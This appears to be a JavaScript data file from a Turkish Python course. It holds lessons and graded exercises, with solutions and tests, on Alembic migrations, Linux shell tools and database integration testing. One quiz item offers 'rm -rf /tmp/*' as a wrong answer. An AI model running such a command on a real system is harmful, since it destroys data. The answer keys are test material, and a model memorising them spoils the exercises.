        q: 'Canlı sistemde <code>siparis</code> tablosuna zorunlu (<code>NOT NULL</code>) <code>kanal</code> sütunu eklemek istiyorsun. Kesintisiz yol hangisi?',
        o: [
          'Önce NOT NULL sütunu ekle, sonra kodu dağıt',
          'Kodu dağıt, sonra NOT NULL sütunu ekle',
          'Nullable ekle, yeni kod yazsın, eskileri doldur, sonra NOT NULL yap',
          'Tabloyu yeni adla kopyalayıp eski tabloyla tek seferde yer değiştir'
        ],
        a: 2,
        why: 'NOT NULL sütun eklendiği anda eski kodun INSERT\'leri hata verir; yeni kod önce dağıtılırsa olmayan sütuna yazmaya çalışır. Genişlet-daralt kalıbında sütun önce nullable eklenir, veri doldurulur, kısıt en son ayrı bir sürümde eklenir.'
      },
      {
        t: 'predict',
        id: 'sqlalchemy-orm-y3',
        stage: 'Kodu oku',
        q: 'Alembic zincirini taklit eden bu kod ne yazdırır?',
        o: ['[\'c3\', \'d4\']', '[\'d4\', \'c3\']', '[\'b2\', \'c3\', \'d4\']', '[\'a1\', \'b2\', \'c3\', \'d4\']'],
        a: 0,
        code: 'zincir = {"a1": None, "b2": "a1", "c3": "b2", "d4": "c3"}\nmevcut = "b2"\nyol = []\nr = "d4"\nwhile r != mevcut:\n    yol.append(r)\n    r = zincir[r]\nprint(list(reversed(yol)))\n',
        why: 'Döngü head\'den (d4) başlayıp down_revision bağlantılarıyla mevcut halkaya (b2) kadar geri yürür: d4, c3. b2 zaten uygulandığı için listeye girmez. Ters çevrilince uygulama sırası çıkar: c3, sonra d4.'
      },
      {
        t: 'predict',
        id: 'sqlalchemy-orm-y4',
        stage: 'Kodu oku',
        q: 'SQLite\'ta bu migration ne yazdırır?',
        o: ['eklendi', '[(1, \'Ece\', None)]', '[(1, \'Ece\', \'bilinmiyor\')]', '[(1, \'Ece\')]'],
        a: 2,
        code: 'import sqlite3\nc = sqlite3.connect(":memory:")\nc.execute("CREATE TABLE m (id INTEGER, ad TEXT)")\nc.execute("INSERT INTO m VALUES (1, \'Ece\')")\ntry:\n    c.execute("ALTER TABLE m ADD COLUMN sehir TEXT NOT NULL")\n    print("eklendi")\nexcept sqlite3.OperationalError:\n    c.execute("ALTER TABLE m ADD COLUMN sehir TEXT NOT NULL DEFAULT \'bilinmiyor\'")\n    print(c.execute("SELECT * FROM m").fetchall())\n',
        why: 'Var olan satırlar yeni sütunda NULL alacağı için varsayılansız NOT NULL sütun eklenemez; SQLite OperationalError verir. Varsayılan verilince mevcut satır o değerle doldurulur.'
      },
      {
        t: 'order',
        id: 'sqlalchemy-orm-y5',
        stage: 'Kodu oku',
        needs: ['sqlite3'],
        q: '<p>Anadolu Market <code>customers</code> tablosuna genişlet ve geri doldur adımlarıyla <code>alan</code> (e-posta alan adı) sütunu ekleyen satırları sırala. Program boş kalan satır sayısını yazdırır.</p>',
        lines: [
          'import veri',
          'conn = veri.baglan("anadolu_market", tablolar=["customers"])',
          'conn.execute("ALTER TABLE customers ADD COLUMN alan TEXT")',
          'conn.execute("UPDATE customers SET alan = substr(email, instr(email, \'@\') + 1) WHERE email IS NOT NULL")',
          'bos = conn.execute("SELECT COUNT(*) FROM customers WHERE alan IS NULL").fetchone()[0]',
          'print("boş kalan:", bos)'
        ],
        expect: 'boş kalan: 11\n',
        hint: 'Önce sütun eklenmeli (genişlet), sonra doldurulmalı (backfill), en son doğrulanmalı.',
        why: 'Sütun yokken UPDATE hata verir; doldurmadan önce sayarsan 150 boş görürsün. E-postası olmayan 11 müşteri NULL kalır; bu sayıyı loglamak veri migration\'ının doğrulama adımıdır.'
      },
      {
        t: 'code',
        id: 'sqlalchemy-orm-y6',
        stage: 'Rehberli',
        diff: 2,
        q: '<p>Alembic\'in <code>upgrade head</code> planını hesapla. <code>yukseltme_plani(zincir, mevcut)</code> yaz: <code>zincir</code> sözlüğü her revizyonu <code>down_revision</code>\'ına eşler (ilk halkanın değeri <code>None</code>). Head, hiçbir revizyonun <code>down_revision</code>\'ı olmayan revizyondur. <code>mevcut</code> veritabanındaki sürümdür (<code>None</code> ise hiç migration uygulanmamış). Uygulanacak revizyonları eski→yeni sırada liste döndür. Birden çok head varsa <code>ValueError("birden çok head")</code> fırlat.</p>',
        guide: [
          'Tüm down_revision değerlerinden bir küme yap; zincirde olup bu kümede olmayanlar head\'dir.',
          'Head sayısı 1 değilse ValueError fırlat.',
          'Head\'den başla, mevcut\'a gelene kadar zincir[r] ile geri yürü, her adımı listeye ekle.',
          'Listeyi ters çevirip döndür.'
        ],
        example: 'ebeveyn = {"ali": None, "veli": "ali", "can": "veli"}\nr, soy = "can", []\nwhile r is not None:\n    soy.append(r)\n    r = ebeveyn[r]\nprint(soy)\n',
        start: 'def yukseltme_plani(zincir, mevcut):\n    onceller = set(zincir.values())\n    # TODO: head\'leri bul (önceller içinde olmayan revizyonlar)\n    headler = []\n    # TODO: birden çok head varsa ValueError\n    plan = []\n    # TODO: head\'den mevcut\'a kadar geri yürü\n    return plan\n',
        sol: 'def yukseltme_plani(zincir, mevcut):\n    onceller = set(zincir.values())\n    headler = [r for r in zincir if r not in onceller]\n    if len(headler) != 1:\n        raise ValueError("birden çok head")\n    plan = []\n    r = headler[0]\n    while r != mevcut:\n        plan.append(r)\n        r = zincir[r]\n    return list(reversed(plan))\n',
        tests: 'z = {"a1": None, "b2": "a1", "c3": "b2", "d4": "c3"}\nassert yukseltme_plani(z, "b2") == ["c3", "d4"], "b2\'den sonra c3 ve d4 uygulanmalı"\nassert yukseltme_plani(z, None) == ["a1", "b2", "c3", "d4"], "Boş veritabanında tüm zincir uygulanır"\nassert yukseltme_plani(z, "d4") == [], "Zaten head\'deysen plan boş olmalı"\ntry:\n    yukseltme_plani({"a1": None, "b2": "a1", "x9": "a1"}, "a1")\n    assert False, "İki dal aynı halkadan ayrılınca ValueError beklenir (alembic merge gerekir)"\nexcept ValueError:\n    pass\n',
        hints: ['Head, başka hiçbir revizyonun önceli olmayan halkadır.', 'set(zincir.values()) öncelleri verir; head = zincirde olup orada olmayan.', 'while r != mevcut: plan.append(r); r = zincir[r]'],
        why: 'Alembic sürüm dosyalarını bu bağlı liste mantığıyla okur. İki head, iki geliştiricinin aynı halkadan dal açtığını gösterir; alembic merge ile ortak bir halka eklenene kadar upgrade head çalışmaz.'
      },
      {
        t: 'code',
        id: 'sqlalchemy-orm-y7',
        stage: 'Kendin yaz',
        diff: 2,
        needs: ['sqlite3'],
        q: '<p>Küçük bir migration çalıştırıcısı yaz: <code>calistir(conn, migrationlar, hedef)</code>. <code>migrationlar</code> sıralı bir listedir: <code>(rev, upgrade_sql, downgrade_sql)</code>. Sürüm <code>alembic_version(version_num)</code> tablosunda tek satırdır; tablo yoksa oluştur ve <code>\'base\'</code> yaz. <code>hedef</code> listedeki bir rev ya da <code>\'base\'</code> olabilir: ileri gerekiyorsa sıradaki upgrade\'leri, geri gerekiyorsa downgrade\'leri ters sırada uygula. Her adım kendi transaction\'ında çalışsın ve sürüm her adımda güncellensin. Fonksiyon uygulanan rev\'lerin listesini döndürsün.</p>',
        start: 'def calistir(conn, migrationlar, hedef):\n    # alembic_version tablosu, ileri ve geri yön\n    pass\n',
        sol: 'def calistir(conn, migrationlar, hedef):\n    conn.execute("CREATE TABLE IF NOT EXISTS alembic_version (version_num TEXT)")\n    if conn.execute("SELECT COUNT(*) FROM alembic_version").fetchone()[0] == 0:\n        conn.execute("INSERT INTO alembic_version VALUES (\'base\')")\n        conn.commit()\n    sira = ["base"] + [m[0] for m in migrationlar]\n    mevcut = conn.execute("SELECT version_num FROM alembic_version").fetchone()[0]\n    i, j = sira.index(mevcut), sira.index(hedef)\n    uygulanan = []\n    if j > i:\n        for rev, up, down in migrationlar[i:j]:\n            with conn:\n                conn.execute(up)\n                conn.execute("UPDATE alembic_version SET version_num = ?", (rev,))\n            uygulanan.append(rev)\n    else:\n        for k in range(i, j, -1):\n            rev, up, down = migrationlar[k - 1]\n            with conn:\n                conn.execute(down)\n                conn.execute("UPDATE alembic_version SET version_num = ?", (sira[k - 1],))\n            uygulanan.append(rev)\n    return uygulanan\n',
        tests: 'import sqlite3\nc = sqlite3.connect(":memory:")\nM = [("r1", "CREATE TABLE urun (id INTEGER)", "DROP TABLE urun"),\n     ("r2", "ALTER TABLE urun ADD COLUMN fiyat REAL", "ALTER TABLE urun DROP COLUMN fiyat"),\n     ("r3", "CREATE INDEX ix_fiyat ON urun(fiyat)", "DROP INDEX ix_fiyat")]\nsurum = lambda: c.execute("SELECT version_num FROM alembic_version").fetchone()[0]\nassert calistir(c, M, "r3") == ["r1", "r2", "r3"], "base\'den r3\'e üç migration uygulanmalı"\nassert surum() == "r3", "Sürüm tablosu r3 göstermeli"\nassert calistir(c, M, "r1") == ["r3", "r2"], "Geri giderken önce r3, sonra r2 geri alınır"\nassert surum() == "r1", "Downgrade sonrası sürüm r1 olmalı"\ncols = [r[1] for r in c.execute("PRAGMA table_info(urun)")]\nassert cols == ["id"], "r2 geri alınınca fiyat sütunu silinmiş olmalı"\nassert calistir(c, M, "base") == ["r1"], "base\'e inince r1 geri alınır"\nassert c.execute("SELECT COUNT(*) FROM sqlite_master WHERE name=\'urun\'").fetchone()[0] == 0, "urun tablosu silinmiş olmalı"\nassert calistir(c, M, "base") == [], "Zaten hedefteysen hiçbir şey yapılmamalı"\n',
        hints: [
          'Sıra listesi ["base", "r1", "r2", ...] kur; mevcut ve hedefin indekslerini karşılaştır.',
          'İleri: migrationlar[i:j]; geri: k = i, i-1, ..., j+1 için migrationlar[k-1]\'in downgrade\'i ve sürüm sira[k-1].',
          'with conn: bloğu adımı ve sürüm güncellemesini aynı transaction\'da tutar.'
        ],
        why: 'Alembic\'in çekirdeği budur: sıralı halkalar, tek satırlık sürüm tablosu ve her adımın atomik uygulanması. Adım ile sürüm güncellemesi aynı transaction\'da olmazsa yarıda kalan bir dağıtım şemayla sürüm tablosunu birbirinden koparır.'
      },
      {
        t: 'code',
        id: 'sqlalchemy-orm-y8',
        stage: 'Hata avı',
        kind: 'bug',
        diff: 2,
        needs: ['sqlite3'],
        q: '<p>Hatayı bul ve düzelt. <code>plaka_ekle(conn)</code> Anadolu Market <code>customers</code> tablosuna zorunlu <code>plaka</code> sütunu ekleyip bilinen şehirleri doldurmalı; bilinmeyen şehirler <code>0</code> almalı. Fonksiyon SQLite\'ta hata veriyor. Genişlet-daralt mantığıyla düzelt: sütunu önce boş değerlere izin vererek ekle, doldur, sonra kalan boşları 0 yap. Fonksiyon doldurulan (0 olmayan) satır sayısını döndürsün.</p>',
        start: 'KODLAR = {"İstanbul": 34, "Ankara": 6, "İzmir": 35}\n\ndef plaka_ekle(conn):\n    conn.execute("ALTER TABLE customers ADD COLUMN plaka INTEGER NOT NULL")\n    for sehir, kod in KODLAR.items():\n        conn.execute("UPDATE customers SET plaka = ? WHERE city = ?", (kod, sehir))\n    conn.commit()\n    return conn.execute("SELECT COUNT(*) FROM customers WHERE plaka != 0").fetchone()[0]\n',
        sol: 'KODLAR = {"İstanbul": 34, "Ankara": 6, "İzmir": 35}\n\ndef plaka_ekle(conn):\n    conn.execute("ALTER TABLE customers ADD COLUMN plaka INTEGER")\n    for sehir, kod in KODLAR.items():\n        conn.execute("UPDATE customers SET plaka = ? WHERE city = ?", (kod, sehir))\n    conn.execute("UPDATE customers SET plaka = 0 WHERE plaka IS NULL")\n    conn.commit()\n    return conn.execute("SELECT COUNT(*) FROM customers WHERE plaka != 0").fetchone()[0]\n',
        tests: 'import veri\nc = veri.baglan("anadolu_market", tablolar=["customers"])\nn = plaka_ekle(c)\nassert n == 59, f"İstanbul (28) + Ankara (15) + İzmir (16) = 59 satır dolmalı, gelen {n}"\nassert c.execute("SELECT COUNT(*) FROM customers WHERE plaka IS NULL").fetchone()[0] == 0, "Hiç NULL kalmamalı; bilinmeyenler 0 olmalı"\nassert c.execute("SELECT COUNT(*) FROM customers WHERE plaka = 0").fetchone()[0] == 91, "Kalan 91 müşteri 0 almalı"\n',
        hints: ['Hata mesajı: varsayılansız NOT NULL sütun eklenemez.', 'Sütunu NOT NULL olmadan ekle, doldurduktan sonra boşları 0 yap.', 'UPDATE customers SET plaka = 0 WHERE plaka IS NULL'],
        why: 'Var olan satırlar yeni sütunda NULL olacağından NOT NULL kısıtı ekleme anında sağlanamaz. Önce genişlet, sonra doldur; kısıtı gerçek sistemde ayrı bir migration ile (SQLite\'ta batch_alter_table ile) eklersin.'
      },
      {
        t: 'code',
        id: 'sqlalchemy-orm-y9',
        stage: 'Meydan okuma',
        diff: 3,
        q: '<p>Async kalıbı: <code>AsyncSession</code> eşzamanlı görevler arasında paylaşılmaz. Sahte bir <code>Oturum</code> sınıfı hazır: aynı oturum aynı anda iki sorgu çalıştırırsa <code>RuntimeError</code> verir. <code>async def toplu_ciro(oturum_fabrikasi, musteri_idleri)</code> yaz: her müşteri için <b>ayrı oturum</b> açıp (<code>async with oturum_fabrikasi() as s</code>) <code>await s.ciro(mid)</code> çağırsın, tüm sorguları <code>asyncio.gather</code> ile eşzamanlı çalıştırsın ve sonuçları <code>{musteri_id: ciro}</code> sözlüğü olarak döndürsün.</p>',
        start: 'import asyncio\n\nCIRO = {1: 1250.0, 2: 980.5, 3: 0.0, 4: 3100.0}\n\nclass Oturum:\n    acilan = 0\n    aktif = 0\n    en_fazla = 0\n    def __init__(self):\n        self.mesgul = False\n        Oturum.acilan += 1\n    async def __aenter__(self):\n        return self\n    async def __aexit__(self, *a):\n        return False\n    async def ciro(self, mid):\n        if self.mesgul:\n            raise RuntimeError("Bu oturum başka bir sorguyla meşgul")\n        self.mesgul = True\n        Oturum.aktif += 1\n        Oturum.en_fazla = max(Oturum.en_fazla, Oturum.aktif)\n        await asyncio.sleep(0.01)\n        Oturum.aktif -= 1\n        self.mesgul = False\n        return CIRO[mid]\n\nasync def toplu_ciro(oturum_fabrikasi, musteri_idleri):\n    async with oturum_fabrikasi() as s:\n        sonuclar = await asyncio.gather(*(s.ciro(m) for m in musteri_idleri))\n    return dict(zip(musteri_idleri, sonuclar))\n',
        sol: 'import asyncio\n\nCIRO = {1: 1250.0, 2: 980.5, 3: 0.0, 4: 3100.0}\n\nclass Oturum:\n    acilan = 0\n    aktif = 0\n    en_fazla = 0\n    def __init__(self):\n        self.mesgul = False\n        Oturum.acilan += 1\n    async def __aenter__(self):\n        return self\n    async def __aexit__(self, *a):\n        return False\n    async def ciro(self, mid):\n        if self.mesgul:\n            raise RuntimeError("Bu oturum başka bir sorguyla meşgul")\n        self.mesgul = True\n        Oturum.aktif += 1\n        Oturum.en_fazla = max(Oturum.en_fazla, Oturum.aktif)\n        await asyncio.sleep(0.01)\n        Oturum.aktif -= 1\n        self.mesgul = False\n        return CIRO[mid]\n\nasync def toplu_ciro(oturum_fabrikasi, musteri_idleri):\n    async def tek(mid):\n        async with oturum_fabrikasi() as s:\n            return await s.ciro(mid)\n    sonuclar = await asyncio.gather(*(tek(m) for m in musteri_idleri))\n    return dict(zip(musteri_idleri, sonuclar))\n',
        tests: 'Oturum.acilan = 0\nOturum.en_fazla = 0\nsonuc = asyncio.run(toplu_ciro(Oturum, [1, 2, 3, 4]))\nassert sonuc == {1: 1250.0, 2: 980.5, 3: 0.0, 4: 3100.0}, f"Sonuç sözlüğü yanlış: {sonuc}"\nassert Oturum.acilan == 4, f"Her görev kendi oturumunu açmalı (4 beklenir), açılan: {Oturum.acilan}"\nassert Oturum.en_fazla == 4, "Dört sorgu aynı anda çalışmalı (gather); sırayla await etmek eşzamanlılığı yok eder"\nassert asyncio.run(toplu_ciro(Oturum, [])) == {}, "Boş liste boş sözlük döndürmeli"\n',
        hints: [
          'Paylaşılan oturumda ikinci sorgu ilki bitmeden başlıyor; hata bu yüzden.',
          'Tek müşteriyi işleyen iç bir async fonksiyon yaz; oturumu onun içinde aç.',
          'sonuclar = await asyncio.gather(*(tek(m) for m in musteri_idleri))'
        ],
        why: 'Gerçek AsyncSession da tek bir bağlantı üzerinde sırayla çalışır; paylaşılınca "another operation is in progress" hatası alırsın. Her eşzamanlı görev kendi oturumunu açar; bağlantıları havuz (pool) yönetir.'
      }
    ],
    faq: [
      {
        q: 'Migration dosyalarını sonradan düzenleyebilir miyim?',
        a: 'Henüz hiçbir ortama (staging, prod, takım arkadaşının makinesi) uygulanmadıysa evet. Uygulandıktan sonra düzenlersen o ortamlar değişikliği hiç görmez, çünkü Alembic yalnız sürüm numarasına bakar. Uygulanmış bir migration\'ı düzeltmek için yeni bir migration yaz.'
      },
      {
        q: 'Async SQLAlchemy her zaman daha mı hızlı?',
        a: 'Hayır. Tek bir sorgu async ile hızlanmaz; kazanç, aynı süreçte çok sayıda eşzamanlı isteğin veritabanını beklerken birbirini bloklamamasıdır. Toplu iş, betik ve Django/Flask gibi senkron uygulamalarda senkron SQLAlchemy daha basit ve yeterlidir.'
      }
    ],
    mistakes: [
      {
        why: 'Migration içinde uygulama modelini import etmek, model ileride değişince eski migration\'ı bozar. Veri migration\'larında op.execute ile SQL ya da migration içinde tanımlanan hafif tablo nesnesi kullan.',
        bad: 'def upgrade():\n    from app.models import Musteri\n    for m in session.query(Musteri): ...',
        good: 'def upgrade():\n    op.execute("UPDATE musteri SET plaka = 34 WHERE sehir = \'İstanbul\'")'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'terminal-temelleri' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'terminal-temelleri',
    min: 30,
    html: `<p>Bu bölüm, bir sunucuya bağlandığında ya da büyük bir log dosyasıyla karşılaştığında işini görecek Linux kabuk (shell) araçlarını tanıtıyor. Amaç her bayrağı ezberlemek değil; hangi aracın hangi işe yaradığını bilip gerektiğinde <code>man grep</code> ya da <code>grep --help</code> ile ayrıntıya bakabilmek. Her aracın yanında Python karşılığını da göreceksin: ikisini birlikte bilmek, ne zaman tek satırlık komutun ne zaman betiğin daha uygun olduğunu seçmeni sağlar. Windows'ta bu komutları WSL (Windows Subsystem for Linux) ya da Git Bash ile kullanabilirsin.</p>
<h2>Metin araçları: grep, sed, awk, jq</h2>
<div class="tbl-wrap"><table><tr><th>Komut</th><th>Ne yapar?</th><th>Python karşılığı</th></tr>
<tr><td><code>grep -i "hata" app.log</code></td><td>Deseni içeren satırları yazar (<code>-i</code> büyük/küçük harf duyarsız, <code>-v</code> tersini, <code>-c</code> sayısını, <code>-r</code> klasörde özyinelemeli)</td><td><code>[s for s in satirlar if "hata" in s.lower()]</code></td></tr>
<tr><td><code>sed 's/eski/yeni/g' dosya</code></td><td>Satır satır bul-değiştir (<code>g</code> olmadan satırdaki yalnız ilk eşleşme)</td><td><code>re.sub("eski", "yeni", satir)</code></td></tr>
<tr><td><code>awk -F, '{t+=$10} END {print t}'</code></td><td>Satırları sütunlara böler (<code>$1</code>, <code>$2</code>... 1'den başlar), hesap yapar</td><td><code>sum(float(s.split(",")[9]) ...)</code></td></tr>
<tr><td><code>jq '.items[].fiyat' veri.json</code></td><td>JSON içinden alan seçer, süzer</td><td><code>[x["fiyat"] for x in d["items"]]</code></td></tr>
<tr><td><code>sort | uniq -c | sort -rn</code></td><td>Sırala, ardışık tekrarları say, sayıya göre azalan diz</td><td><code>Counter(...).most_common()</code></td></tr>
<tr><td><code>cut -d, -f2</code>, <code>head</code>, <code>tail -f</code>, <code>wc -l</code></td><td>Sütun kes, ilk/son satırlar, canlı izle, satır say</td><td><code>split</code>, dilim, <code>len</code></td></tr></table></div>
<pre class="code"># En çok 404 alan 5 yol (erişim logunda 7. alan yol, 9. alan durum kodu)
awk '$9 == 404 {print $7}' access.log | sort | uniq -c | sort -rn | head -5
# Son 1 saatteki hataları canlı izle
tail -f app.log | grep --line-buffered ERROR
# Lezzet Kurye siparişlerinde duruma göre teslimat ücreti toplamı
awk -F, 'NR &gt; 1 {t[$8] += $10} END {for (k in t) print k, t[k]}' lk_orders.csv
# API yanıtından yalnız adlar
curl -s https://api.example.com/urunler | jq -r '.[] | select(.stok == 0) | .ad'</pre>
<p>Aynı awk satırının Python karşılığı aşağıda; gerçek <code>lk_orders</code> dosyasında çalışıyor. Kısa ve tek seferlik sorularda kabuk daha hızlıdır; mantık büyüyünce, test gerekince ya da Windows'ta da çalışması gerekince Python kazanır.</p>
<pre class="py">import veri
yol = veri.yol("lezzet_kurye", "lk_orders")
toplam = {}
with open(yol, encoding="utf-8") as f:
    next(f)                                   # NR &gt; 1: başlığı atla
    for satir in f:
        alan = satir.rstrip("\\n").split(",")  # -F,
        toplam[alan[7]] = toplam.get(alan[7], 0) + float(alan[9])   # $8, $10
for durum, tutar in sorted(toplam.items()):
    print(durum, round(tutar, 2))</pre>
<h2>Dosya bulmak ve toplu işlem: find ve xargs</h2>
<pre class="code">find . -name "*.py" -mtime -1              # son 1 günde değişen .py dosyaları
find /var/log -name "*.log" -size +100M    # 100 MB'tan büyük loglar
find . -name "__pycache__" -type d -prune -exec rm -rf {} +
grep -rl "TODO" src/ | xargs wc -l         # TODO içeren dosyaların satır sayısı
find . -name "*.csv" -print0 | xargs -0 -n 1 python temizle.py   # boşluklu adlara dayanıklı</pre>
<p><code>xargs</code>, girdideki her satırı bir komutun argümanına çevirir. Dosya adlarında boşluk olabileceği için <code>-print0</code> ve <code>-0</code> çiftini alışkanlık edin. Python'da karşılığı <code>Path(".").rglob("*.py")</code> ve döngüdür.</p>
<h2>İzinler ve chmod</h2>
<p><code>ls -l</code> çıktısındaki <code>-rwxr-x---</code> üç gruba ayrılır: sahip (user), grup (group), diğerleri (other). Her grupta okuma (r=4), yazma (w=2), çalıştırma (x=1) vardır; toplamları sayısal izni verir: <code>rwx</code>=7, <code>r-x</code>=5, <code>---</code>=0 → <b>750</b>.</p>
<pre class="py">import stat
for izin in (0o755, 0o644, 0o600, 0o750):
    print(oct(izin)[2:], stat.filemode(stat.S_IFREG | izin))</pre>
<pre class="code">chmod 755 deploy.sh        # sahibi her şey, diğerleri oku+çalıştır
chmod u+x betik.py         # sembolik: sahibine çalıştırma ekle
chmod 600 ~/.ssh/id_ed25519   # özel anahtar yalnız sahibine açık olmalı
chown app:app /srv/market -R</pre>
<div class="warn"><b>chmod 777 çözüm değildir</b>"Permission denied" alınca 777 vermek herkese yazma izni açar. Önce dosyanın sahibini (<code>ls -l</code>) ve hangi kullanıcıyla çalıştığını (<code>whoami</code>) kontrol et; gerekeni ver. SSH özel anahtarının izni geniş olursa ssh onu kullanmayı reddeder.</div>
<h2>Süreçler, uzak sunucu ve tmux</h2>
<div class="tbl-wrap"><table><tr><th>Komut</th><th>İş</th></tr>
<tr><td><code>ps aux | grep gunicorn</code>, <code>top</code> / <code>htop</code></td><td>Çalışan süreçleri, CPU ve bellek kullanımını gör</td></tr>
<tr><td><code>kill 4321</code> / <code>kill -9 4321</code></td><td>SIGTERM: "düzgün kapan" ricası; SIGKILL: anında öldür (temizlik yapılamaz, son çare)</td></tr>
<tr><td><code>ssh-keygen -t ed25519</code>, <code>ssh-copy-id kul@sunucu</code></td><td>Anahtar çifti üret, açık anahtarı sunucuya koy; parolasız ve güvenli giriş</td></tr>
<tr><td><code>ssh kul@sunucu</code>, <code>scp rapor.csv kul@sunucu:/srv/veri/</code></td><td>Uzak kabuk; dosya kopyala (büyük ve tekrarlı kopyada <code>rsync -avz</code>)</td></tr>
<tr><td><code>tmux new -s etl</code>, <code>Ctrl+b d</code>, <code>tmux attach -t etl</code></td><td>Oturum aç, ayrıl (bağlantı kopsa da iş sürer), geri bağlan</td></tr></table></div>
<p>Uzun süren bir eğitim ya da ETL işini SSH üzerinden başlatıp bağlantın koparsa iş ölür; tmux (ya da screen) içinde başlatırsan oturum sunucuda yaşamaya devam eder. Python tarafında SIGTERM'i yakalayıp yarım işi kaydetmek docker-deploy dersindeki "düzgün kapanma" konusudur.</p>
<div class="note"><b>Gerçek işte</b>Üretimde bir sorun çıktığında ilk dakikalar genellikle şöyle geçer: <code>ssh</code> ile bağlan, <code>df -h</code> ile disk, <code>free -m</code> ile bellek, <code>ps</code>/<code>top</code> ile süreçlere bak, <code>tail -n 200 app.log | grep -i error</code> ile son hataları oku. Bu akışı rahat yapabilmek mühendis, backend ve ML rollerinde mülakatlarda da sorulur.</div>`,
    ex: [{
        t: 'mc',
        id: 'terminal-temelleri-y1',
        stage: 'Isınma',
        q: '<code>chmod 640 maaslar.csv</code> sonrası izin durumu nedir?',
        o: [
          'Sahip okur ve yazar, grup yalnız okur, diğerleri hiçbir şey yapamaz',
          'Sahip her şeyi yapar, grup ve diğerleri yalnızca okuyabilir',
          'Herkes okuyabilir ama yalnızca dosyanın sahibi yazabilir',
          'Sahip okur, grup yazar, diğerleri yalnızca çalıştırabilir'
        ],
        a: 0,
        why: '6 = 4 + 2 (okuma + yazma), 4 = okuma, 0 = hiçbir şey. Sıra her zaman sahip, grup, diğerleri. Hassas bir dosya için bu yaygın ve doğru bir ayardır.'
      },
    {
        t: 'mc',
        id: 'terminal-temelleri-y2',
        stage: 'Isınma',
        q: 'Takılan bir ETL sürecini kapatmak istiyorsun ve yarım kalan dosyayı temizlemesini bekliyorsun. Hangi komutla başlamalısın?',
        o: ['<code>kill -9 PID</code>', '<code>kill PID</code>', '<code>rm -rf /tmp/*</code>', '<code>chmod 000 PID</code>'],
        a: 1,
        why: 'kill varsayılan olarak SIGTERM gönderir; süreç bunu yakalayıp temizlik yapabilir. kill -9 (SIGKILL) yakalanamaz, süreç anında ölür ve geride yarım dosya, kilit dosyası bırakabilir; yalnız SIGTERM işe yaramazsa kullanılır.'
      }],
    faq: [
      {
        q: 'Windows kullanıyorum; bu komutları öğrenmem gerekli mi?',
        a: 'Sunucuların, konteynerlerin ve CI makinelerinin çok büyük bölümü Linux çalıştırır; bir gün mutlaka bağlanacaksın. Windows\'ta WSL ile gerçek bir Ubuntu kabuğu kurabilirsin (wsl --install). Git for Windows ile gelen Git Bash de grep, sed, awk, find gibi temel araçları içerir.'
      },
      {
        q: 'SSH parolası mı, SSH anahtarı mı?',
        a: 'Anahtar. ssh-keygen -t ed25519 ile çift üret, özel anahtar (id_ed25519) bilgisayarında kalır ve parola cümlesiyle korunur; açık anahtar (.pub) sunucuya ve GitHub\'a eklenir. Sunucuda parola ile girişi kapatmak kaba kuvvet saldırılarını etkisiz kılar.'
      }
    ]
  }
);
})(window);
/* Kesit Python — 'test-ileri' uzantısı (AUDIT 12, Derinleş + ek alıştırmalar) */
(function (W) {
'use strict';
const X = W.PY_EXT = W.PY_EXT || [];
X.push(
  {
    id: 'test-ileri',
    min: 30,
    html: `<p>Mock ve fake'ler hızlıdır ama bir noktada gerçek parçalarla da sınaman gerekir: SQL sorgun PostgreSQL'de gerçekten çalışıyor mu, API'n yayımladığı sözleşmeye uyuyor mu, sistem yük altında ne kadar dayanıyor? Bu bölüm test piramidinin üst katlarını uygulamalı olarak açıyor: gerçek veritabanıyla entegrasyon testi, sözleşme testi ve yük testi.</p>
<h2>Gerçek veritabanı, temiz durum: transaction rollback fixture</h2>
<p>Entegrasyon testlerinin en büyük sorunu durumdur: bir testin eklediği satır diğerini bozar. Her testte veritabanını sıfırdan kurmak yavaştır. Yaygın çözüm, her testi <b>geri alınacak bir transaction</b> içinde çalıştırmaktır: test başında <code>BEGIN</code>, sonunda <code>ROLLBACK</code>. Test istediği kadar yazar, iz bırakmaz. Test edilen kod kendi içinde <code>commit()</code> çağırıyorsa, dış transaction'ı korumak için iç işlemleri bir <b>savepoint</b>'e (iç içe transaction) bağlarsın.</p>
<pre class="code"># conftest.py (SQLAlchemy 2.0 + pytest)
import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import Session

@pytest.fixture(scope="session")
def engine():
    from testcontainers.postgres import PostgresContainer    # pip install testcontainers
    with PostgresContainer("postgres:16") as pg:             # gerçek PostgreSQL, geçici konteyner
        eng = create_engine(pg.get_connection_url())
        Base.metadata.create_all(eng)                        # ya da: alembic upgrade head
        yield eng

@pytest.fixture
def db(engine):
    with engine.connect() as conn:
        dis = conn.begin()                                   # dış transaction
        oturum = Session(bind=conn, join_transaction_mode="create_savepoint")
        yield oturum                                         # kodun commit'i yalnız savepoint'i kapatır
        oturum.close()
        dis.rollback()                                       # her şey geri alınır</pre>
<p><b>testcontainers</b>, test oturumu başında Docker'da gerçek bir PostgreSQL (ya da Redis, Kafka) başlatır ve sonunda siler. SQLite ile test edip PostgreSQL'de çalıştırmak, <code>ILIKE</code>, JSONB, eşzamanlı kilitler ve tarih fonksiyonlarındaki farkları kaçırır. CI'da Docker varsa bu yaklaşım pratik ve güvenilirdir. Aynı fikrin sqlite3 ile çalışan küçük hâli:</p>
<pre class="py">import sqlite3
from contextlib import contextmanager

conn = sqlite3.connect(":memory:", isolation_level=None)    # transaction'ları elle yönet
conn.execute("CREATE TABLE siparis (id INTEGER PRIMARY KEY, tutar REAL)")
conn.execute("INSERT INTO siparis (tutar) VALUES (100)")

@contextmanager
def test_islemi(c):
    c.execute("BEGIN")
    try:
        yield c
    finally:
        c.execute("ROLLBACK")

def siparis_ekle(c, tutar):            # test edilen kod: kendi savepoint'ini açar ve kapatır
    c.execute("SAVEPOINT ekle")
    c.execute("INSERT INTO siparis (tutar) VALUES (?)", (tutar,))
    c.execute("RELEASE ekle")

with test_islemi(conn) as c:
    siparis_ekle(c, 250)
    print("test içinde:", c.execute("SELECT COUNT(*) FROM siparis").fetchone()[0])
print("test sonrası:", conn.execute("SELECT COUNT(*) FROM siparis").fetchone()[0])</pre>
<h2>Sözleşme testi: API'n söz verdiği gibi mi?</h2>
